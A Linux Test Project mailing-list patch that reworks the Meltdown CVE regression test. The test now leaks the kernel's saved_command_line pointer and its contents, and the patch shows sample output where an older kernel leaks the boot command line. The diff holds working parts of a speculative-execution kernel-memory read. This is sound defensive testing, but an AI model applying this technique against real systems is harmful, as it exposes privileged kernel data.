From: Jan Stancek <jstancek@redhat.com>
Date: Wed, 20 Jun 2018 13:51:58 +0200
Subject: [LTP] [PATCH] cve/meltdown: read *saved_command_line
Message-ID: <761d2d176c0765f3913e140191ceaf83aa745424.1529495077.git.jstancek@redhat.com>
List-Id: <ltp.lists.linux.it>
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
To: ltp@lists.linux.it

After commit 8c06c7740d19 ("x86/pti: Leave kernel text global for !PCID"),
kernel can now map all of kernel text into the user page tables.
So, read of "linux_proc_banner" can succeed and report a false positive.

This patch changes the test to read value of "saved_command_line"
pointer and then also memory pointed to by it. And compares result
(first 32 bytes) to /proc/cmdline. saved_command_line string is
allocated dynamically and falls outside of (_text, _end) area:
  crash> p/x _text
  $2 = 0xffffffff81000000 <startup_64>
  crash> p/x _end
  $3 = 0xffffffff82411000
  crash> p/x &saved_command_line
  $4 = 0xffffffff81cf3008
  crash> p/x saved_command_line
  $5 = 0xffff88007ff55100
so test should work on kernels with and without the patch.

Signed-off-by: Jan Stancek <jstancek@redhat.com>
---
 testcases/cve/meltdown.c | 64 ++++++++++++++++++++++++++++++++++++------------
 1 file changed, 48 insertions(+), 16 deletions(-)

1. older kernel: 3.10.0-693.el7.x86_64
# ./meltdown 
tst_test.c:1015: INFO: Timeout per run is 0h 05m 00s
meltdown.c:259: INFO: access time: cached = 61, uncached = 501, threshold = 174
meltdown.c:309: INFO: &saved_command_line == 0xffffffff81cf3008
meltdown.c:342: INFO: read ffffffff81cf3008 = 0x00  
meltdown.c:342: INFO: read ffffffff81cf3009 = 0x51 Q
meltdown.c:342: INFO: read ffffffff81cf300a = 0xf5  
meltdown.c:342: INFO: read ffffffff81cf300b = 0x7f  
meltdown.c:342: INFO: read ffffffff81cf300c = 0x00  
meltdown.c:342: INFO: read ffffffff81cf300d = 0x88  
meltdown.c:342: INFO: read ffffffff81cf300e = 0xff  
meltdown.c:342: INFO: read ffffffff81cf300f = 0xff  
meltdown.c:350: INFO: save_command_line: 0xffff88007ff55100
meltdown.c:362: INFO: read ffff88007ff55100 = 0x42 B | expected 0x42 | match: 1
meltdown.c:362: INFO: read ffff88007ff55101 = 0x4f O | expected 0x4f | match: 1
meltdown.c:362: INFO: read ffff88007ff55102 = 0x4f O | expected 0x4f | match: 1
meltdown.c:362: INFO: read ffff88007ff55103 = 0x54 T | expected 0x54 | match: 1
meltdown.c:362: INFO: read ffff88007ff55104 = 0x5f _ | expected 0x5f | match: 1
meltdown.c:362: INFO: read ffff88007ff55105 = 0x49 I | expected 0x49 | match: 1
meltdown.c:362: INFO: read ffff88007ff55106 = 0x4d M | expected 0x4d | match: 1
meltdown.c:362: INFO: read ffff88007ff55107 = 0x41 A | expected 0x41 | match: 1
meltdown.c:362: INFO: read ffff88007ff55108 = 0x47 G | expected 0x47 | match: 1
meltdown.c:362: INFO: read ffff88007ff55109 = 0x45 E | expected 0x45 | match: 1
meltdown.c:362: INFO: read ffff88007ff5510a = 0x3d = | expected 0x3d | match: 1
meltdown.c:362: INFO: read ffff88007ff5510b = 0x2f / | expected 0x2f | match: 1
meltdown.c:362: INFO: read ffff88007ff5510c = 0x76 v | expected 0x76 | match: 1
meltdown.c:362: INFO: read ffff88007ff5510d = 0x6d m | expected 0x6d | match: 1
meltdown.c:362: INFO: read ffff88007ff5510e = 0x6c l | expected 0x6c | match: 1
meltdown.c:362: INFO: read ffff88007ff5510f = 0x69 i | expected 0x69 | match: 1
meltdown.c:362: INFO: read ffff88007ff55110 = 0x6e n | expected 0x6e | match: 1
meltdown.c:362: INFO: read ffff88007ff55111 = 0x75 u | expected 0x75 | match: 1
meltdown.c:362: INFO: read ffff88007ff55112 = 0x7a z | expected 0x7a | match: 1
meltdown.c:362: INFO: read ffff88007ff55113 = 0x2d - | expected 0x2d | match: 1
meltdown.c:362: INFO: read ffff88007ff55114 = 0x33 3 | expected 0x33 | match: 1
meltdown.c:362: INFO: read ffff88007ff55115 = 0x2e . | expected 0x2e | match: 1
meltdown.c:362: INFO: read ffff88007ff55116 = 0x31 1 | expected 0x31 | match: 1
meltdown.c:362: INFO: read ffff88007ff55117 = 0x30 0 | expected 0x30 | match: 1
meltdown.c:362: INFO: read ffff88007ff55118 = 0x2e . | expected 0x2e | match: 1
meltdown.c:362: INFO: read ffff88007ff55119 = 0x30 0 | expected 0x30 | match: 1
meltdown.c:362: INFO: read ffff88007ff5511a = 0x2d - | expected 0x2d | match: 1
meltdown.c:362: INFO: read ffff88007ff5511b = 0x36 6 | expected 0x36 | match: 1
meltdown.c:362: INFO: read ffff88007ff5511c = 0x39 9 | expected 0x39 | match: 1
meltdown.c:362: INFO: read ffff88007ff5511d = 0x33 3 | expected 0x33 | match: 1
meltdown.c:362: INFO: read ffff88007ff5511e = 0x2e . | expected 0x2e | match: 1
meltdown.c:362: INFO: read ffff88007ff5511f = 0x65 e | expected 0x65 | match: 1
meltdown.c:373: FAIL: I was able to read your kernel memory!!!
meltdown.c:376: INFO: score(matched/all): 32 / 32

2. recent upstream kernel: 4.17+
# ./meltdown 
tst_test.c:1015: INFO: Timeout per run is 0h 05m 00s
meltdown.c:259: INFO: access time: cached = 49, uncached = 332, threshold = 127
meltdown.c:309: INFO: &saved_command_line == 0xffffffffaa993008
meltdown.c:342: INFO: read ffffffffaa993008 = 0x00  
meltdown.c:342: INFO: read ffffffffaa993009 = 0x00  
meltdown.c:342: INFO: read ffffffffaa99300a = 0x00  
meltdown.c:342: INFO: read ffffffffaa99300b = 0x00  
meltdown.c:342: INFO: read ffffffffaa99300c = 0x00  
meltdown.c:342: INFO: read ffffffffaa99300d = 0x00  
meltdown.c:342: INFO: read ffffffffaa99300e = 0x00  
meltdown.c:342: INFO: read ffffffffaa99300f = 0x00  
meltdown.c:350: INFO: save_command_line: 0x0
meltdown.c:375: PASS: I was not able to read your kernel memory
meltdown.c:376: INFO: score(matched/all): 0 / 32


diff --git a/testcases/cve/meltdown.c b/testcases/cve/meltdown.c
index dce84a0c316b..a53ea9b8e533 100644
--- a/testcases/cve/meltdown.c
+++ b/testcases/cve/meltdown.c
@@ -189,7 +189,7 @@ readbit(int fd, unsigned long addr, char bit)
 	for (i = 0; i < CYCLES; i++) {
 		ret = pread(fd, buf, sizeof(buf), 0);
 		if (ret < 0)
-			tst_res(TBROK | TERRNO, "can't read /proc/version");
+			tst_res(TBROK | TERRNO, "can't read fd");
 
 		clflush_target();
 
@@ -298,17 +298,17 @@ find_kernel_symbol(const char *name)
 	return addr;
 }
 
-unsigned long linux_proc_banner_addr;
-int banner_fd;
+static unsigned long saved_cmdline_addr;
+static int spec_fd;
 
 static void setup(void)
 {
 	set_cache_hit_threshold();
 
-	linux_proc_banner_addr = find_kernel_symbol("linux_proc_banner");
-	tst_res(TINFO, "linux_proc_banner is@%lx", linux_proc_banner_addr);
+	saved_cmdline_addr = find_kernel_symbol("saved_command_line");
+	tst_res(TINFO, "&saved_command_line == 0x%lx", saved_cmdline_addr);
 
-	banner_fd = SAFE_OPEN("/proc/version", O_RDONLY);
+	spec_fd = SAFE_OPEN("/proc/cmdline", O_RDONLY);
 
 	memset(target_array, 1, sizeof(target_array));
 
@@ -316,37 +316,69 @@ static void setup(void)
 		tst_res(TBROK | TERRNO, "set_signal");
 }
 
+#define READ_SIZE 32
+
 static void run(void)
 {
-	unsigned int i, score, ret;
-	static char expected[] = "%s version %s";
-	static char read[32];
-	unsigned long addr = linux_proc_banner_addr;
-	unsigned long size = sizeof(expected) - 1;
-
+	unsigned int i, score = 0, ret;
+	unsigned long addr;
+	unsigned long size;
+	char read[READ_SIZE] = { 0 };
+	char expected[READ_SIZE] = { 0 };
+	int expected_len;
+
+	expected_len = pread(spec_fd, expected, sizeof(expected), 0);
+	if (expected_len < 0)
+		tst_res(TBROK | TERRNO, "can't read test fd");
+
+	/* read address of saved_cmdline_addr */
+	addr = saved_cmdline_addr;
+	size = sizeof(addr);
 	for (i = 0; i < size; i++) {
-		ret = readbyte(banner_fd, addr);
+		ret = readbyte(spec_fd, addr);
 
 		read[i] = ret;
-		tst_res(TINFO, "read %lx = 0x%x %c", addr, ret,
+		tst_res(TINFO, "read %lx = 0x%02x %c", addr, ret,
 			isprint(ret) ? ret : ' ');
 
 		addr++;
 	}
 
-	for (score = 0, i = 0; i < size; i++)
+	/* read value pointed to by saved_cmdline_addr */
+	memcpy(&addr, read, sizeof(addr));
+	memset(read, 0, sizeof(read));
+	tst_res(TINFO, "save_command_line: 0x%lx", addr);
+	size = expected_len;
+
+	if (!addr)
+		goto done;
+
+	for (i = 0; i < size; i++) {
+		ret = readbyte(spec_fd, addr);
+
+		read[i] = ret;
+		tst_res(TINFO, "read %lx = 0x%02x %c | expected 0x%02x |"
+			" match: %d", addr, ret, isprint(ret) ? ret : ' ',
+			expected[i], read[i] == expected[i]);
+
+		addr++;
+	}
+
+	for (i = 0; i < size; i++)
 		if (expected[i] == read[i])
 			score++;
 
+done:
 	if (score > size / 2)
 		tst_res(TFAIL, "I was able to read your kernel memory!!!");
 	else
 		tst_res(TPASS, "I was not able to read your kernel memory");
+	tst_res(TINFO, "score(matched/all): %u / %lu", score, size);
 }
 
 static void cleanup(void)
 {
-	SAFE_CLOSE(banner_fd);
+	SAFE_CLOSE(spec_fd);
 }
 
 static struct tst_test test = {
-- 
1.8.3.1

